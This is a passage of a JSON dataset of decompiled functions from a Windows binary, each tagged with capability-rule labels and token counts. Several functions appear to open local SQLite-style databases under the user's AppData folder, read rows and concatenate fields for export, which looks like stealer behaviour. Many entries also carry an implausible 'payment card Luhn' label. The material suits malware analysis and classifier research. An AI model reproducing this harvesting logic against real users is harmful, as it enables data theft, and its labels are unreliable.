    "00415870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415870(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    (**0x463038)(&var_108h, uVar1);\n    (**0x462ee0)(arg_8h, &var_108h, 1);\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    (**0x462e8c)(&var_20ch, 0x4472f8, arg_10h, arg_ch);\n    iVar2 = (**0x452598)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_21ch, *0x451f7c, 0xffffffff, &var_210h, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x463094)(0, 999999);\n            *NULL = (**0x46301c)(uVar1);\n            iVar2 = (**0x452560)(var_210h);\n            while (iVar2 == 100) {\n                (**0x452584)(var_210h, 0);\n                uVar1 = (**0x452584)(var_210h, 0);\n                (**0x463038)(stack0xfffffde8, uVar1);\n                (**0x463038)(stack0xfffffde8, 0x4452fc);\n                iVar2 = (**0x452560)(var_210h);\n            }\n            uVar1 = (**0x462f30)(unique0x1000025d);\n            fcn.00429a10(arg_1ch, &var_20ch, stack0xfffffde8, uVar1);\n            fcn.0042a6e0(&var_215h + 1, 0, 4);\n        }\n        (**0x452564)(var_210h);\n        (**0x45259c)(var_21ch);\n    }\n    arg_8h_00 = &var_108h;\n    (**0x462f3c)();\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 666
    },
    "00415a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415a60(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    (**0x463038)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x462ee0)(arg_8h, &var_108h);\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    (**0x462e8c)(&var_20ch, 0x44730c, arg_10h, arg_ch);\n    uVar3 = *0x45233c;\n    iVar2 = (**0x452598)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x463094)(0, 999999);\n            var_210h = (**0x46301c)(uVar3);\n            iVar2 = (**0x452560)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x452584)(unique0x10000283, 0);\n                uVar4 = (**0x452584)(stack0xfffffde8, 1);\n                (**0x463038)(var_210h, uVar3);\n                (**0x463038)(var_210h, 0x4452fc);\n                (**0x463038)(var_210h, uVar4);\n                (**0x463038)(var_210h, 0x446f30);\n                iVar2 = (**0x452560)(stack0xfffffde8);\n            }\n            uVar3 = (**0x462f30)(var_210h);\n            fcn.00429a10(arg_1ch, &var_20ch, var_210h, uVar3);\n            fcn.0042a6e0(&var_210h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffde8);\n        (**0x45259c)(var_21ch);\n    }\n    (**0x462f3c)(&var_108h);\n    fcn.0042a75a(uVar1);\n    return;\n}\n",
        "token_count": 712
    },
    "00415c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n\nvoid __cdecl fcn.00415c80(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_110h = arg_ch;\n    iVar1 = (**0x452580)(arg_10h);\n    if ((iVar1 == 0) && (iVar1 = fcn.0042d410(0x45254c),  iVar1 < 0x20)) {\n        fcn.0042a6e0(&var_108h, 0, 0x104);\n        (**0x463038)(&var_108h, arg_10h);\n        (**0x463038)(&var_108h, 0x445308);\n        (**0x463038)(&var_108h, *0x45238c);\n        iVar1 = (**0x462ecc)(&var_108h, 0x80000000, 1, 0, 3, 0, 0);\n        var_10ch = iVar1;\n        if (iVar1 != 0) {\n            (**0x462ee8)(iVar1, 0, 0, 2);\n            iVar2 = (**0x4630a8)(iVar1, 0);\n            (**0x462ee8)(iVar1, 0, 0, 0);\n            var_114h = fcn.00429c39(iVar2 + 1);\n            (**0x462ff4)(iVar1, var_114h, iVar2, &var_118h, 0);\n            iVar2 = (**0x462eb8)(var_114h, *0x451c70);\n            while (iVar2 != 0) {\n                iVar1 = (**0x462f30)(*0x451c70);\n                iVar1 = iVar2 + 3 + iVar1;\n                iVar2 = (**0x462eb8)(iVar1, *0x451ee4);\n                *(iVar2 + -3) = 0;\n                (**0x463038)(arg_14h, 0x4452fc);\n                (**0x463038)(arg_14h, *0x451f94);\n                (**0x463038)(arg_14h, var_110h);\n                (**0x463038)(arg_14h, 0x4452fc);\n                (**0x463038)(arg_14h, *0x45229c);\n                (**0x463038)(arg_14h, iVar1);\n                (**0x463038)(arg_14h, 0x4452fc);\n                iVar2 = (**0x462eb8)(iVar2 + -2, *0x452130);\n                iVar1 = (**0x462f30)(*0x452130);\n                iVar1 = iVar2 + 3 + iVar1;\n                iVar2 = (**0x462eb8)(iVar1, *0x45212c);\n                *(iVar2 + -3) = 0;\n                (**0x463038)(arg_14h, *0x451d58);\n                uVar3 = fcn.004151f0(iVar1);\n                (**0x463038)(arg_14h, uVar3);\n                (**0x463038)(arg_14h, 0x4452fc);\n                iVar2 = (**0x462eb8)(iVar2 + -2, *0x45212c);\n                iVar1 = (**0x462f30)(*0x45212c);\n                iVar1 = iVar2 + 3 + iVar1;\n                iVar2 = (**0x462eb8)(iVar1, *0x4522b0);\n                *(iVar2 + -3) = 0;\n                (**0x463038)(arg_14h, *0x452258);\n                uVar3 = fcn.004151f0(iVar1);\n                (**0x463038)(arg_14h, uVar3);\n                (**0x463038)(arg_14h, 0x446f30);\n                iVar2 = (**0x462eb8)(iVar2 + -2, *0x451c70);\n                iVar1 = var_10ch;\n            }\n            (**0x462ed0)(iVar1);\n        }\n        (**0x4525a0)();\n    }\n    fcn.0042a75a(var_118h);\n    return;\n}\n",
        "token_count": 1055
    },
    "00415f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint *arg_8h_00;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    (**0x463038)(&var_20ch, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    (**0x463038)(&var_20ch, uVar1);\n    (**0x462ee0)(arg_8h, &var_20ch, 1);\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, 0x445308);\n    (**0x463038)(&var_108h, *0x4521c0);\n    (**0x463038)(&var_108h, 0x445308);\n    (**0x463038)(&var_108h, arg_10h);\n    (**0x463038)(&var_108h, 0x44733c);\n    arg_8h_00 = &var_108h;\n    (**0x463038)(arg_8h_00, arg_ch);\n    (**0x463038)(&var_108h, 0x445300);\n    uVar1 = *0x451ce0;\n    iVar2 = (**0x452598)(&var_20ch, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_21ch, uVar1, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x463094)(0, 999999);\n            var_210h = (**0x46301c)(uVar1);\n            iVar2 = (**0x452560)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar1 = (**0x452584)(unique0x10000490, 0);\n                uVar3 = (**0x452584)(stack0xfffffde8, 1);\n                uVar4 = (**0x452584)(stack0xfffffde8, 2);\n                uVar5 = (**0x452584)(stack0xfffffde8, 3);\n                uVar6 = (**0x452584)(stack0xfffffde8, 4);\n                uVar7 = (**0x452584)(stack0xfffffde8, 5);\n                uVar8 = (**0x452584)(stack0xfffffde8, 6);\n                iVar2 = (**0x463068)(uVar3, 0x447338);\n                if (iVar2 == 0) {\n                    fcn.0042a6e0(uVar3, 0, 4);\n                    uVar9 = 0x447330;\n                }\n                else {\n                    fcn.0042a6e0(uVar3, 0, 4);\n                    uVar9 = 0x447328;\n                }\n                (**0x463038)(uVar3, uVar9);\n                iVar2 = (**0x463068)(uVar5, 0x447338);\n                if (iVar2 == 0) {\n                    fcn.0042a6e0(uVar5, 0, 4);\n                    uVar9 = 0x447330;\n                }\n                else {\n                    fcn.0042a6e0(uVar5, 0, 4);\n                    uVar9 = 0x447328;\n                }\n                (**0x463038)(uVar5, uVar9);\n                (**0x463038)(var_210h, uVar1);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar3);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar4);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar5);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar6);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar7);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar8);\n                (**0x463038)(var_210h, 0x4452fc);\n                iVar2 = (**0x452560)(stack0xfffffde8);\n            }\n            uVar1 = (**0x462f30)(var_210h);\n            fcn.00429a10(arg_14h, &var_108h, var_210h, uVar1);\n            fcn.0042a6e0(&var_210h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffde8);\n        (**0x45259c)(var_21ch);\n    }\n    (**0x462f3c)(&var_20ch);\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1385
    },
    "00416340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416340(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    (**0x463038)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x462ee0)(arg_8h, &var_108h);\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    (**0x462e8c)(&var_20ch, 0x4472f8, arg_10h, arg_ch);\n    uVar3 = *0x451dac;\n    iVar2 = (**0x452598)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x463094)(0, 999999);\n            var_210h = (**0x46301c)(uVar3);\n            iVar2 = (**0x452560)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x452584)(unique0x10000250, 0);\n                (**0x463038)(var_210h, uVar3);\n                (**0x463038)(var_210h, 0x4452fc);\n                iVar2 = (**0x452560)(stack0xfffffde8);\n            }\n            uVar3 = (**0x462f30)(var_210h);\n            fcn.00429a10(arg_14h, &var_20ch, var_210h, uVar3);\n            fcn.0042a6e0(&var_210h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffde8);\n        (**0x45259c)(var_21ch);\n    }\n    (**0x462f3c)(&var_108h);\n    fcn.0042a75a(uVar1);\n    return;\n}\n",
        "token_count": 637
    },
    "00416520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416520(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    (**0x463038)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x462ee0)(arg_8h, &var_108h);\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    (**0x462e8c)(&var_20ch, 0x4472e4, arg_10h, arg_ch);\n    uVar3 = *0x451b60;\n    iVar2 = (**0x452598)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x463094)(0, 999999);\n            var_210h = (**0x46301c)(uVar3);\n            iVar2 = (**0x452560)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x452584)(unique0x10000283, 0);\n                uVar4 = (**0x452584)(stack0xfffffde8, 1);\n                (**0x463038)(var_210h, uVar3);\n                (**0x463038)(var_210h, 0x447324);\n                (**0x463038)(var_210h, uVar4);\n                (**0x463038)(var_210h, 0x4452fc);\n                iVar2 = (**0x452560)(stack0xfffffde8);\n            }\n            uVar3 = (**0x462f30)(var_210h);\n            fcn.00429a10(arg_14h, &var_20ch, var_210h, uVar3);\n            fcn.0042a6e0(&var_210h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffde8);\n        (**0x45259c)(var_21ch);\n    }\n    (**0x462f3c)(&var_108h);\n    fcn.0042a75a(uVar1);\n    return;\n}\n",
        "token_count": 699
    },
    "00417f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417f30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *arg_8h_00;\n    uint var_214h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    uVar1 = fcn.00420a40(0x1a);\n    (**0x463038)(&var_20ch, uVar1);\n    (**0x463038)(&var_20ch, arg_8h);\n    (**0x463038)(&var_108h, &var_20ch);\n    (**0x463038)(&var_108h, 0x4477b8);\n    (**0x463038)(&var_108h, 0x4477b4);\n    (**0x463038)(&var_108h, 0x4477b0);\n    (**0x463038)(&var_108h, 0x4477ac);\n    (**0x463038)(&var_108h, 0x4477a8);\n    (**0x463038)(&var_108h, 0x4477a4);\n    (**0x463038)(&var_108h, 0x44713c);\n    (**0x463038)(&var_108h, 0x447138);\n    arg_8h_00 = &var_108h;\n    (**0x463038)(arg_8h_00, 0x447130);\n    (**0x463038)(&var_108h, 0x44779c);\n    iVar2 = fcn.004209b0(&var_108h);\n    if (iVar2 != 0) {\n        fcn.004101a0();\n        iVar2 = fcn.00417d80(*0x452154);\n        if (iVar2 != 0) {\n            fcn.00416730(0x4452bc, &var_20ch, arg_ch, *(in_ECX + 0x20), arg_10h);\n        }\n        (**0x4630f4)(*0x45258c);\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 588
    },
    "004180e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004180e0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042b2b1(0x20);\n    iVar1 = fcn.00405950(arg_8h, arg_ch, 0, var_4h);\n    arg_8h_00 = var_4h;\n    if (iVar1 == 0) {\n        if (var_4h != 0) {\n            *0x452544 = fcn.00405a20(var_4h, *0x451bc0);\n            *0x452560 = fcn.00405a20(arg_8h_00, *0x451f8c);\n            *0x45259c = fcn.00405a20(arg_8h_00, *0x45221c);\n            *0x452584 = fcn.00405a20(arg_8h_00, *0x451f60);\n            *0x452574 = fcn.00405a20(arg_8h_00, *0x452288);\n            *0x452598 = fcn.00405a20(arg_8h_00, *0x452020);\n            *0x45256c = fcn.00405a20(arg_8h_00, *0x4520ec);\n            *0x452564 = fcn.00405a20(arg_8h_00, *0x451fa0);\n            return 1;\n        }\n    }\n    else {\n        fcn.0042a6e0(&var_4h, 0, 4);\n    }\n    return 0;\n}\n",
        "token_count": 396
    },
    "00418290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418290(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00429c44(arg_8h & 0xff, in_ECX + 8);\n    return;\n}\n",
        "token_count": 56
    },
    "004182b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.004182b0(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00429c44(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "004182e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004182e0(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0042a347(arg_8h & 0xff, in_ECX + 8);\n    return;\n}\n",
        "token_count": 57
    },
    "00418300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00418300(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.0042a347(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 134
    },
    "00418340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418340(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.0042a840(arg_10h, arg_8h, arg_ch - arg_8h);\n    return arg_ch;\n}\n",
        "token_count": 65
    },
    "00418380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418380(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    fcn.0042a840(arg_14h, arg_8h, arg_ch - arg_8h);\n    return arg_ch;\n}\n",
        "token_count": 71
    },
    "00418aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418aa0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *var_ch;\n    \n    iVar1 = 0;\n    if (arg_8h != 0) {\n        if ((arg_8h < 0x924924a) && (iVar1 = fcn.0042b2b1(arg_8h * 0x1c),  iVar1 != 0)) {\n            return iVar1;\n        }\n        arg_8h = 0;\n        fcn.0042ac29(&arg_8h);\n        var_ch = \"WSHS4954XGCLRNSRX\";\n        iVar1 = fcn.0042b331(&var_ch, 0x44c6c0);\n    }\n    return iVar1;\n}\n",
        "token_count": 180
    },
    "00418b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418b60(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e3a4;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00429e0b(0);\n    *(in_ECX + 4) = 0;\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x1c) = 0;\n    *(in_ECX + 0x20) = 0;\n    var_4h = 4;\n    arg_ch = arg_8h;\n    if (arg_8h == 0) {\n        arg_8h = 0x4478bc;\n        fcn.0042ac29(&arg_8h);\n        var_1ch = 0x447284;\n        arg_ch = fcn.0042b331(&var_1ch, 0x44d35c);\n    }\n    fcn.0042a027(in_ECX, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 374
    },
    "00418c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418c10(int32_t param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e3f4;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 4;\n    fcn.00429fb4(param_1);\n    if (*(param_1 + 0x1c) != 0) {\n        fcn.0042a7fd(*(param_1 + 0x1c));\n    }\n    *(param_1 + 0x1c) = 0;\n    if (*(param_1 + 0x14) != 0) {\n        fcn.0042a7fd(*(param_1 + 0x14));\n    }\n    *(param_1 + 0x14) = 0;\n    if (*(param_1 + 0xc) != 0) {\n        fcn.0042a7fd(*(param_1 + 0xc));\n    }\n    *(param_1 + 0xc) = 0;\n    if (*(param_1 + 4) != 0) {\n        fcn.0042a7fd(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    var_4h = 0xffffffff;\n    fcn.00429e33();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 348
    },
    "00419520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419520(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x54) != 0) {\n        if ((arg_8h == 0) && ((arg_ch | arg_10h) == 0)) {\n            arg_10h_00 = 4;\n        }\n        else {\n            arg_10h_00 = 0;\n        }\n        iVar1 = fcn.0042dd05(*(in_ECX + 0x54), arg_8h, arg_10h_00, arg_ch);\n        if (iVar1 == 0) {\n            fcn.00418e20(*(in_ECX + 0x54), 1);\n            return in_ECX;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 215
    },
    "00419770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419770(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    \n    piVar2 = fcn.00419630(arg_8h);\n    cVar1 = (**(*piVar2 + 4))();\n    if (cVar1 != '\\0') {\n        *(in_ECX + 0x44) = 0;\n        return;\n    }\n    *(in_ECX + 0x44) = piVar2;\n    fcn.00418a40();\n    return;\n}\n",
        "token_count": 132
    },
    "0041a230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a230(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_18h;\n    var_8h = arg_14h;\n    if ((((*(in_ECX + 0x54) != 0) && (cVar2 = fcn.00419ab0(),  cVar2 != '\\0')) &&\n        (iVar3 = fcn.0042e1b7(*(in_ECX + 0x54), &var_8h),  iVar3 == 0)) &&\n       ((((arg_ch | arg_10h) == 0 || (iVar3 = fcn.0042e138(*(in_ECX + 0x54), arg_ch, arg_10h, 1),  iVar3 == 0)) &&\n        (iVar3 = fcn.0042e041(*(in_ECX + 0x54), &var_8h),  iVar3 == 0)))) {\n        *(in_ECX + 0x4c) = arg_1ch;\n        fcn.00418a10();\n        arg_8h[2] = var_8h;\n        uVar1 = *(in_ECX + 0x4c);\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[3] = var_4h;\n        arg_8h[4] = uVar1;\n        return;\n    }\n    *arg_8h = *0x448780;\n    arg_8h[1] = *0x448784;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 462
    },
    "0041a310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041a310(int32_t param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x54) != 0) {\n        cVar2 = fcn.00419ab0();\n        iVar4 = param_1;\n        if (cVar2 == '\\0') {\n            iVar4 = 0;\n        }\n        iVar3 = fcn.0042e25f(*(param_1 + 0x54));\n        if (iVar3 == 0) goto code_r0x0041a33b;\n    }\n    iVar4 = 0;\ncode_r0x0041a33b:\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x50) = 0;\n    *(param_1 + 0x49) = 0;\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x24) = param_1 + 0x1c;\n    *(param_1 + 0x14) = param_1 + 0xc;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 0x34) = param_1 + 0x2c;\n    *(param_1 + 0xc) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    *(param_1 + 0x54) = 0;\n    uVar1 = *0x4625e0;\n    *(param_1 + 0x44) = 0;\n    *(param_1 + 0x4c) = uVar1;\n    return iVar4;\n}\n",
        "token_count": 482
    },
    "0041a3a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a3a0(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    if (in_ECX != arg_8h) {\n        if (7 < in_ECX[5]) {\n            fcn.0042a679(*in_ECX);\n        }\n        in_ECX[5] = 7;\n        in_ECX[4] = 0;\n        *in_ECX = 0;\n        if (arg_8h[5] < 8) {\n            fcn.0042adb0(in_ECX, arg_8h, arg_8h[4] * 2 + 2);\n        }\n        else {\n            *in_ECX = *arg_8h;\n            *arg_8h = 0;\n        }\n        in_ECX[4] = arg_8h[4];\n        in_ECX[5] = arg_8h[5];\n        arg_8h[4] = 0;\n        arg_8h[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "0041a840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
